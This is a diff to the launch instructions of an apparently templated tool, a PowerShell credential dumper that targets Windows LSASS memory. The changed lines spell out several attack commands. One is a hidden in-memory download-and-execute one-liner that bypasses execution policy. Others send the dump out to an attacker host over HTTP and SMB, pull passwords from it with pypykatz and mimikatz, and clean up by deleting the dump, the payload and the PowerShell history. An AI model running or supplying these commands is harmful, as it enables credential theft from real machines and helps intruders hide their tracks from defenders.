@@ -64,27 +64,27 @@ output:
     PowerShell LSASS MiniDump Credential Dumper - Launch Instructions
 
     Transfer and Execute (In-Memory):
-    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:8080/{{ output_file }}')"
+    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
 
     Alternative (File-Based Execution):
-    python3 -m http.server 8080
-    On target: powershell -ep bypass -c "IWR -Uri http://YOUR_IP:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    $ python3 -m http.server 80
+    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
     Exfiltrate Dump File:
-    python3 -m http.server 8080
-    On target: Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"
+    $ python3 -m http.server 80
+    $ Invoke-WebRequest -Uri "http://{{ lhost }}/upload" -Method POST -InFile "{{ dump_path }}"
 
     Or via SMB:
-    impacket-smbserver share . -smb2support
-    On target: copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
+    $ impacket-smbserver share . -smb2support
+    $ copy {{ dump_path }} \\{{ lhost }}\share\lsass.dmp
 
     Extract Credentials:
-    pypykatz lsa minidump lsass.dmp
+    $ pypykatz lsa minidump lsass.dmp
 
     Or with Mimikatz (Windows):
-    mimikatz.exe
-    sekurlsa::minidump lsass.dmp
-    sekurlsa::logonPasswords full
+    $ mimikatz.exe
+    $ sekurlsa::minidump lsass.dmp
+    $ sekurlsa::logonPasswords full
 
     Notes:
     - Dump path: {{ dump_path }} (typically 50-200 MB)
@@ -107,6 +107,6 @@ output:
 
     Cleanup:
     On target:
-    Remove-Item {{ dump_path }} -Force
-    Remove-Item {{ output_file }} -Force
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    $ Remove-Item {{ dump_path }} -Force
+    $ Remove-Item {{ output_file }} -Force
+    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
